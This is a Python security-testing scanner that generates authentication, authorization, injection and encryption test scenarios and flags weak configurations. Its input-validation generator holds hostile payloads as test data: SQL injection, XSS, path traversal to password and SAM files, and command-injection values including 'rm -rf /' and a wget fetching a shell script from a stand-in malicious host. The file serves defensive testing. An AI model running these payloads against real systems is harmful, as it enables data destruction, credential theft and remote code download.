"""
Security Test Scanner for Automated Testing Framework

Provides comprehensive security testing including authentication, authorization,
input validation, and vulnerability scanning.
"""

import hashlib
import secrets
import base64
import json
import time
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime, timedelta
import logging
import re


@dataclass
class SecurityTestScenario:
    """Security test scenario definition"""
    scenario_id: str
    category: str
    description: str
    attack_vector: str
    expected_behavior: str
    severity: str


@dataclass
class SecurityFinding:
    """Security test finding"""
    finding_id: str
    scenario_id: str
    severity: str  # 'critical', 'high', 'medium', 'low', 'info'
    title: str
    description: str
    evidence: Optional[Dict] = None
    remediation: Optional[str] = None


class SecurityTestScanner:
    """Comprehensive security testing scanner"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.auth_scenarios = self._initialize_auth_scenarios()
        self.authz_scenarios = self._initialize_authz_scenarios()
        self.input_scenarios = self._initialize_input_scenarios()
        self.encryption_scenarios = self._initialize_encryption_scenarios()
        
    def _initialize_auth_scenarios(self) -> List[SecurityTestScenario]:
        """Initialize authentication test scenarios"""
        return [
            SecurityTestScenario(
                scenario_id='AUTH_001',
                category='authentication',
                description='Valid token authentication',
                attack_vector='valid_jwt_token',
                expected_behavior='allow_access',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='AUTH_002',
                category='authentication',
                description='Expired token rejection',
                attack_vector='expired_jwt_token',
                expected_behavior='deny_access',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='AUTH_003',
                category='authentication',
                description='Malformed token rejection',
                attack_vector='malformed_jwt_token',
                expected_behavior='deny_access',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='AUTH_004',
                category='authentication',
                description='Missing token rejection',
                attack_vector='no_token',
                expected_behavior='deny_access',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='AUTH_005',
                category='authentication',
                description='Token signature validation',
                attack_vector='invalid_signature',
                expected_behavior='deny_access',
                severity='critical'
            ),
            SecurityTestScenario(
                scenario_id='AUTH_006',
                category='authentication',
                description='Token replay attack prevention',
                attack_vector='replayed_token',
                expected_behavior='deny_access',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='AUTH_007',
                category='authentication',
                description='Brute force protection',
                attack_vector='multiple_failed_attempts',
                expected_behavior='rate_limit_applied',
                severity='medium'
            )
        ]
    
    def _initialize_authz_scenarios(self) -> List[SecurityTestScenario]:
        """Initialize authorization test scenarios"""
        return [
            SecurityTestScenario(
                scenario_id='AUTHZ_001',
                category='authorization',
                description='Role-based access control',
                attack_vector='insufficient_privileges',
                expected_behavior='deny_access',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='AUTHZ_002',
                category='authorization',
                description='Scope validation',
                attack_vector='invalid_scope',
                expected_behavior='deny_access',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='AUTHZ_003',
                category='authorization',
                description='Resource access control',
                attack_vector='unauthorized_resource_access',
                expected_behavior='deny_access',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='AUTHZ_004',
                category='authorization',
                description='Privilege escalation prevention',
                attack_vector='privilege_escalation_attempt',
                expected_behavior='deny_access',
                severity='critical'
            ),
            SecurityTestScenario(
                scenario_id='AUTHZ_005',
                category='authorization',
                description='Cross-tenant access prevention',
                attack_vector='cross_tenant_access',
                expected_behavior='deny_access',
                severity='high'
            )
        ]
    
    def _initialize_input_scenarios(self) -> List[SecurityTestScenario]:
        """Initialize input validation test scenarios"""
        return [
            SecurityTestScenario(
                scenario_id='INPUT_001',
                category='input_validation',
                description='SQL injection prevention',
                attack_vector='sql_injection',
                expected_behavior='reject_input',
                severity='critical'
            ),
            SecurityTestScenario(
                scenario_id='INPUT_002',
                category='input_validation',
                description='XSS prevention',
                attack_vector='xss_payload',
                expected_behavior='sanitize_input',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='INPUT_003',
                category='input_validation',
                description='Command injection prevention',
                attack_vector='command_injection',
                expected_behavior='reject_input',
                severity='critical'
            ),
            SecurityTestScenario(
                scenario_id='INPUT_004',
                category='input_validation',
                description='Path traversal prevention',
                attack_vector='path_traversal',
                expected_behavior='reject_input',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='INPUT_005',
                category='input_validation',
                description='JSON injection prevention',
                attack_vector='json_injection',
                expected_behavior='reject_input',
                severity='medium'
            ),
            SecurityTestScenario(
                scenario_id='INPUT_006',
                category='input_validation',
                description='Buffer overflow prevention',
                attack_vector='oversized_input',
                expected_behavior='reject_input',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='INPUT_007',
                category='input_validation',
                description='Format string attack prevention',
                attack_vector='format_string_attack',
                expected_behavior='reject_input',
                severity='medium'
            )
        ]
    
    def _initialize_encryption_scenarios(self) -> List[SecurityTestScenario]:
        """Initialize encryption test scenarios"""
        return [
            SecurityTestScenario(
                scenario_id='ENCRYPT_001',
                category='encryption',
                description='Data at rest encryption',
                attack_vector='unencrypted_storage',
                expected_behavior='data_encrypted',
                severity='critical'
            ),
            SecurityTestScenario(
                scenario_id='ENCRYPT_002',
                category='encryption',
                description='Data in transit encryption',
                attack_vector='unencrypted_transmission',
                expected_behavior='tls_enforced',
                severity='critical'
            ),
            SecurityTestScenario(
                scenario_id='ENCRYPT_003',
                category='encryption',
                description='Weak encryption algorithm detection',
                attack_vector='weak_cipher',
                expected_behavior='strong_encryption_used',
                severity='high'
            ),
            SecurityTestScenario(
                scenario_id='ENCRYPT_004',
                category='encryption',
                description='Key management security',
                attack_vector='exposed_keys',
                expected_behavior='keys_protected',
                severity='critical'
            ),
            SecurityTestScenario(
                scenario_id='ENCRYPT_005',
                category='encryption',
                description='Certificate validation',
                attack_vector='invalid_certificate',
                expected_behavior='certificate_validated',
                severity='high'
            )
        ]
    
    def generate_auth_scenario(self) -> Dict[str, Any]:
        """Generate authentication test scenario"""
        import random
        
        scenario = random.choice(self.auth_scenarios)
        
        if scenario.attack_vector == 'valid_jwt_token':
            return {
                'scenario': scenario,
                'test_data': {
                    'token': self._generate_valid_jwt(),
                    'expected_status': 200
                }
            }
        elif scenario.attack_vector == 'expired_jwt_token':
            return {
                'scenario': scenario,
                'test_data': {
                    'token': self._generate_expired_jwt(),
                    'expected_status': 401
                }
            }
        elif scenario.attack_vector == 'malformed_jwt_token':
            return {
                'scenario': scenario,
                'test_data': {
                    'token': 'malformed.jwt.token',
                    'expected_status': 401
                }
            }
        elif scenario.attack_vector == 'no_token':
            return {
                'scenario': scenario,
                'test_data': {
                    'token': None,
                    'expected_status': 401
                }
            }
        elif scenario.attack_vector == 'invalid_signature':
            return {
                'scenario': scenario,
                'test_data': {
                    'token': self._generate_jwt_with_invalid_signature(),
                    'expected_status': 401
                }
            }
        else:
            return {
                'scenario': scenario,
                'test_data': {
                    'attack_type': scenario.attack_vector,
                    'expected_status': 401
                }
            }
    
    def generate_authz_scenario(self) -> Dict[str, Any]:
        """Generate authorization test scenario"""
        import random
        
        scenario = random.choice(self.authz_scenarios)
        
        roles = ['read_only', 'read_write', 'admin', 'guest']
        scopes = ['read:calculations', 'write:calculations', 'read:parameters', 'write:parameters', 'admin:all']
        
        if scenario.attack_vector == 'insufficient_privileges':
            return {
                'scenario': scenario,
                'test_data': {
                    'user_role': 'read_only',
                    'required_role': 'admin',
                    'action': 'write:parameters',
                    'expected_status': 403
                }
            }
        elif scenario.attack_vector == 'invalid_scope':
            return {
                'scenario': scenario,
                'test_data': {
                    'user_scopes': ['read:calculations'],
                    'required_scope': 'write:parameters',
                    'expected_status': 403
                }
            }
        elif scenario.attack_vector == 'privilege_escalation_attempt':
            return {
                'scenario': scenario,
                'test_data': {
                    'user_role': 'read_only',
                    'attempted_action': 'admin:all',
                    'expected_status': 403
                }
            }
        else:
            return {
                'scenario': scenario,
                'test_data': {
                    'attack_type': scenario.attack_vector,
                    'user_role': random.choice(roles),
                    'expected_status': 403
                }
            }
    
    def generate_input_scenario(self) -> Dict[str, Any]:
        """Generate input validation test scenario"""
        import random
        
        scenario = random.choice(self.input_scenarios)
        
        if scenario.attack_vector == 'sql_injection':
            payloads = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM sensitive_data --",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --"
            ]
            return {
                'scenario': scenario,
                'test_data': {
                    'payload': random.choice(payloads),
                    'field': 'entity_id',
                    'expected_status': 400
                }
            }
        elif scenario.attack_vector == 'xss_payload':
            payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ]
            return {
                'scenario': scenario,
                'test_data': {
                    'payload': random.choice(payloads),
                    'field': 'description',
                    'expected_status': 400
                }
            }
        elif scenario.attack_vector == 'command_injection':
            payloads = [
                "; ls -la",
                "| cat /etc/passwd",
                "&& rm -rf /",
                "; wget http://malicious.com/shell.sh"
            ]
            return {
                'scenario': scenario,
                'test_data': {
                    'payload': random.choice(payloads),
                    'field': 'filename',
                    'expected_status': 400
                }
            }
        elif scenario.attack_vector == 'path_traversal':
            payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]
            return {
                'scenario': scenario,
                'test_data': {
                    'payload': random.choice(payloads),
                    'field': 'file_path',
                    'expected_status': 400
                }
            }
        else:
            return {
                'scenario': scenario,
                'test_data': {
                    'attack_type': scenario.attack_vector,
                    'payload': 'malicious_input',
                    'expected_status': 400
                }
            }
    
    def generate_encryption_scenario(self) -> Dict[str, Any]:
        """Generate encryption test scenario"""
        import random
        
        scenario = random.choice(self.encryption_scenarios)
        
        if scenario.attack_vector == 'unencrypted_storage':
            return {
                'scenario': scenario,
                'test_data': {
                    'data_type': 'sensitive_calculation_data',
                    'storage_location': 'database',
                    'encryption_required': True
                }
            }
        elif scenario.attack_vector == 'unencrypted_transmission':
            return {
                'scenario': scenario,
                'test_data': {
                    'protocol': 'http',
                    'expected_protocol': 'https',
                    'data_sensitivity': 'high'
                }
            }
        elif scenario.attack_vector == 'weak_cipher':
            return {
                'scenario': scenario,
                'test_data': {
                    'cipher_suite': 'TLS_RSA_WITH_RC4_128_SHA',
                    'minimum_strength': 'TLS_AES_256_GCM_SHA384',
                    'expected_rejection': True
                }
            }
        else:
            return {
                'scenario': scenario,
                'test_data': {
                    'attack_type': scenario.attack_vector,
                    'security_requirement': 'encryption_enforced'
                }
            }
    
    def _generate_valid_jwt(self) -> str:
        """Generate a valid JWT token for testing"""
        import jwt
        
        payload = {
            'sub': 'test_user',
            'iat': int(time.time()),
            'exp': int(time.time()) + 3600,  # 1 hour expiry
            'scopes': ['read:calculations', 'write:calculations'],
            'role': 'read_write'
        }
        
        # Use a test secret key
        secret = 'test_secret_key_for_jwt_generation'
        return jwt.encode(payload, secret, algorithm='HS256')
    
    def _generate_expired_jwt(self) -> str:
        """Generate an expired JWT token for testing"""
        import jwt
        
        payload = {
            'sub': 'test_user',
            'iat': int(time.time()) - 7200,  # 2 hours ago
            'exp': int(time.time()) - 3600,  # 1 hour ago (expired)
            'scopes': ['read:calculations'],
            'role': 'read_only'
        }
        
        secret = 'test_secret_key_for_jwt_generation'
        return jwt.encode(payload, secret, algorithm='HS256')
    
    def _generate_jwt_with_invalid_signature(self) -> str:
        """Generate a JWT with invalid signature for testing"""
        import jwt
        
        payload = {
            'sub': 'test_user',
            'iat': int(time.time()),
            'exp': int(time.time()) + 3600,
            'scopes': ['admin:all'],
            'role': 'admin'
        }
        
        # Use wrong secret to create invalid signature
        wrong_secret = 'wrong_secret_key'
        return jwt.encode(payload, wrong_secret, algorithm='HS256')
    
    def scan_for_vulnerabilities(self, target_data: Dict[str, Any]) -> List[SecurityFinding]:
        """Scan for security vulnerabilities"""
        findings = []
        
        # Check for common vulnerabilities
        findings.extend(self._check_authentication_vulnerabilities(target_data))
        findings.extend(self._check_authorization_vulnerabilities(target_data))
        findings.extend(self._check_input_validation_vulnerabilities(target_data))
        findings.extend(self._check_encryption_vulnerabilities(target_data))
        findings.extend(self._check_configuration_vulnerabilities(target_data))
        
        return findings
    
    def _check_authentication_vulnerabilities(self, data: Dict[str, Any]) -> List[SecurityFinding]:
        """Check for authentication vulnerabilities"""
        findings = []
        
        auth_config = data.get('authentication', {})
        
        # Check for weak authentication
        if auth_config.get('method') == 'basic':
            findings.append(SecurityFinding(
                finding_id='AUTH_VULN_001',
                scenario_id='AUTH_WEAK',
                severity='high',
                title='Weak Authentication Method',
                description='Basic authentication is being used instead of stronger methods like OAuth 2.0',
                remediation='Implement OAuth 2.0 with JWT tokens for stronger authentication'
            ))
        
        # Check for missing rate limiting
        if not auth_config.get('rate_limiting', False):
            findings.append(SecurityFinding(
                finding_id='AUTH_VULN_002',
                scenario_id='AUTH_RATE_LIMIT',
                severity='medium',
                title='Missing Rate Limiting',
                description='No rate limiting configured for authentication endpoints',
                remediation='Implement rate limiting to prevent brute force attacks'
            ))
        
        # Check for weak password policy
        password_policy = auth_config.get('password_policy', {})
        if password_policy.get('min_length', 0) < 12:
            findings.append(SecurityFinding(
                finding_id='AUTH_VULN_003',
                scenario_id='AUTH_WEAK_PASSWORD',
                severity='medium',
                title='Weak Password Policy',
                description='Password minimum length is less than 12 characters',
                remediation='Enforce minimum password length of 12 characters with complexity requirements'
            ))
        
        return findings
    
    def _check_authorization_vulnerabilities(self, data: Dict[str, Any]) -> List[SecurityFinding]:
        """Check for authorization vulnerabilities"""
        findings = []
        
        authz_config = data.get('authorization', {})
        
        # Check for missing RBAC
        if not authz_config.get('rbac_enabled', False):
            findings.append(SecurityFinding(
                finding_id='AUTHZ_VULN_001',
                scenario_id='AUTHZ_NO_RBAC',
                severity='high',
                title='Missing Role-Based Access Control',
                description='RBAC is not implemented, potentially allowing unauthorized access',
                remediation='Implement comprehensive RBAC with principle of least privilege'
            ))
        
        # Check for overly permissive roles
        roles = authz_config.get('roles', {})
        for role_name, permissions in roles.items():
            if isinstance(permissions, list) and 'admin:all' in permissions and role_name != 'admin':
                findings.append(SecurityFinding(
                    finding_id='AUTHZ_VULN_002',
                    scenario_id='AUTHZ_OVERPERMISSIVE',
                    severity='high',
                    title='Overly Permissive Role',
                    description=f'Role {role_name} has admin privileges when it should not',
                    remediation='Review and restrict role permissions to minimum required'
                ))
        
        return findings
    
    def _check_input_validation_vulnerabilities(self, data: Dict[str, Any]) -> List[SecurityFinding]:
        """Check for input validation vulnerabilities"""
        findings = []
        
        validation_config = data.get('input_validation', {})
        
        # Check for missing input sanitization
        if not validation_config.get('sanitization_enabled', False):
            findings.append(SecurityFinding(
                finding_id='INPUT_VULN_001',
                scenario_id='INPUT_NO_SANITIZATION',
                severity='high',
                title='Missing Input Sanitization',
                description='Input sanitization is not enabled, vulnerable to injection attacks',
                remediation='Enable comprehensive input sanitization for all user inputs'
            ))
        
        # Check for missing size limits
        if not validation_config.get('size_limits', {}):
            findings.append(SecurityFinding(
                finding_id='INPUT_VULN_002',
                scenario_id='INPUT_NO_SIZE_LIMITS',
                severity='medium',
                title='Missing Input Size Limits',
                description='No size limits configured for inputs, vulnerable to DoS attacks',
                remediation='Implement appropriate size limits for all input fields'
            ))
        
        return findings
    
    def _check_encryption_vulnerabilities(self, data: Dict[str, Any]) -> List[SecurityFinding]:
        """Check for encryption vulnerabilities"""
        findings = []
        
        encryption_config = data.get('encryption', {})
        
        # Check for missing encryption at rest
        if not encryption_config.get('at_rest', False):
            findings.append(SecurityFinding(
                finding_id='ENCRYPT_VULN_001',
                scenario_id='ENCRYPT_NO_AT_REST',
                severity='critical',
                title='Missing Encryption at Rest',
                description='Sensitive data is not encrypted when stored',
                remediation='Implement AES-256 encryption for all sensitive data at rest'
            ))
        
        # Check for missing encryption in transit
        if not encryption_config.get('in_transit', False):
            findings.append(SecurityFinding(
                finding_id='ENCRYPT_VULN_002',
                scenario_id='ENCRYPT_NO_IN_TRANSIT',
                severity='critical',
                title='Missing Encryption in Transit',
                description='Data is not encrypted during transmission',
                remediation='Enforce TLS 1.3 for all data transmission'
            ))
        
        # Check for weak encryption algorithms
        algorithm = encryption_config.get('algorithm', '')
        weak_algorithms = ['DES', 'RC4', 'MD5', 'SHA1']
        if any(weak_alg in algorithm.upper() for weak_alg in weak_algorithms):
            findings.append(SecurityFinding(
                finding_id='ENCRYPT_VULN_003',
                scenario_id='ENCRYPT_WEAK_ALGORITHM',
                severity='high',
                title='Weak Encryption Algorithm',
                description=f'Weak encryption algorithm detected: {algorithm}',
                remediation='Use strong encryption algorithms like AES-256 and SHA-256'
            ))
        
        return findings
    
    def _check_configuration_vulnerabilities(self, data: Dict[str, Any]) -> List[SecurityFinding]:
        """Check for configuration vulnerabilities"""
        findings = []
        
        config = data.get('configuration', {})
        
        # Check for debug mode in production
        if config.get('debug_mode', False) and config.get('environment') == 'production':
            findings.append(SecurityFinding(
                finding_id='CONFIG_VULN_001',
                scenario_id='CONFIG_DEBUG_PROD',
                severity='high',
                title='Debug Mode Enabled in Production',
                description='Debug mode is enabled in production environment',
                remediation='Disable debug mode in production environments'
            ))
        
        # Check for default credentials
        credentials = config.get('default_credentials', {})
        if credentials.get('username') == 'admin' and credentials.get('password') == 'admin':
            findings.append(SecurityFinding(
                finding_id='CONFIG_VULN_002',
                scenario_id='CONFIG_DEFAULT_CREDS',
                severity='critical',
                title='Default Credentials Detected',
                description='Default admin credentials are still in use',
                remediation='Change all default credentials to strong, unique passwords'
            ))
        
        # Check for exposed sensitive information
        if config.get('expose_stack_traces', False):
            findings.append(SecurityFinding(
                finding_id='CONFIG_VULN_003',
                scenario_id='CONFIG_INFO_DISCLOSURE',
                severity='medium',
                title='Information Disclosure',
                description='Stack traces are exposed to users',
                remediation='Disable stack trace exposure in production'
            ))
        
        return findings